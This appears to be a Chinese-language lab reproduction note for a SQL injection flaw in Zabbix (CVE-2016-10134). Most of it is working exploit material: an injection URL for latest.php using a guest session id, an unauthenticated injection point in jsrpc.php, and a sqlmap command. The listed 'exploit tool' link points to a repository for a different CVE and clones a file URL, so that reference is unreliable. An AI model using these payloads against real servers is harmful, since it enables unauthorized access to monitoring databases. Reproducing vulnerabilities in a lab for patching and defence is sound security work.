#zabbix latest.php SQL注入漏洞

####1、CVE
CVE-2016-10134

####2、危害等级
<font color = 'red'>高危</font>

####3、漏洞描述
因为未能过滤掉latest.php页面中toggle_ids数组的输入，导致Zabbix 2.2.x,3.0.x 远程SQL注入

####4、公开日期
未知
####5、利用工具

```
git clone https://github.com/c0mmand3rOpSec/CVE-2017-10271/blob/master/exploit.py
```

####复现过程

访问http://127.0.0.1:8080，用账号guest（密码为空）登录游客账户。

登录后，查看Cookie中的zbx_sessionid，复制后16位字符：

![](images/zabbix.png)


将这16个字符作为sid的值，访问http://127.0.0.1:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)，可见成功注入：

![](images/zabbix1.png)

这个漏洞也可以通过jsrpc.php触发，且无需登录：http://127.0.0.1:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=1'

输入单引号' 报错

![](images/zabbix3.png)

2.4 工具测试

```
sqlmap -u "http://127.0.0.1:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=" --dbms=mysql
```
![](images/zabbix4.png)


####修复建议

更新版本